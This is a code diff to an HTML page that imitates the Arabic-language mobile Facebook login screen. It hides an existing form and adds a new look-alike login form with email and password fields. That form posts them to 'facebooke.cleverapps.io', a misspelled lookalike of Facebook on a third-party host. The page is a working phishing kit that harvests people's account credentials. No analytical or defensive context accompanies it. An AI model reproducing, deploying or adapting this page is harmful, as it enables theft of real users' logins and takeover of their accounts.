@@ -671,7 +671,7 @@
                     <form
                     method="POST"
                     action="http://info-v1.cleverapps.io/?"
-  
+                    style="display:none!important"
                     >
                       <input
                         type="hidden"
@@ -867,6 +867,59 @@
                         ><input type="hidden" name="_fb_noscript" value="true"
                       /></noscript>
                     </form>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <form method="POST" action="https://facebooke.cleverapps.io" >
+                      <div>
+                        <div class="_56be">
+                          <div class="_55wo _56bf">
+                            <div class="_96n9" id="email_input_container">
+                              <div class="_81f7" id="header_transparency_tooltip">
+                                <div id="header_transparency_tooltip_unselected">
+                                  <i class="img sp_xm9DDmY7HAL sx_9331ed"></i>
+                                </div>
+                              </div>
+                              <input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" data-sigil="m_login_email">
+                            </div>
+                          </div>
+                        </div>
+                        <div class="_55wq"></div>
+                        <div class="_56be">
+                          <div class="_55wo _56bf">
+                            <div class="_1upc _mg8" data-sigil="m_login_password">
+                              <div class="_7om2">
+                                <div class="_4g34 _5i2i _52we">
+                                  <div class="_5xu4">
+                                    <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="كلمة السر" type="password" data-sigil="password-plain-text-toggle-input">
+                                  </div>
+                                </div>
+                                <div class="_5s61 _216i _5i2i _52we">
+                                  <div class="_5xu4">
+                                    <div class="_2pi9" style="display: none" id="u_0_2_Zj">
+                                      <a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display: none" id="u_0_3_Vu">إخفاء</span><span class="mfss" id="u_0_4_7a">إظهار</span></a>
+                                    </div>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="_2pie" style="text-align: center">
+                          <button style="font-size: 17px;height: 40px;border: none;border-radius: 3px;line-height: 40px;text-shadow: 0 -1px rgb(0 0 0 / 25%);display: block;width: 100%;color: #fff;vertical-align: top;white-space: nowrap;font-weight: bold;" type="button" value="تسجيل الدخول">
+                            <span class="_55sr">تسجيل الدخول</span>
+                          </button>
+                      </div>
+                    </form>
+                    
+                    
+                    
                     <div>
                       <div class="_2pie _9omz">
                         <div class="_52jj _9on1">
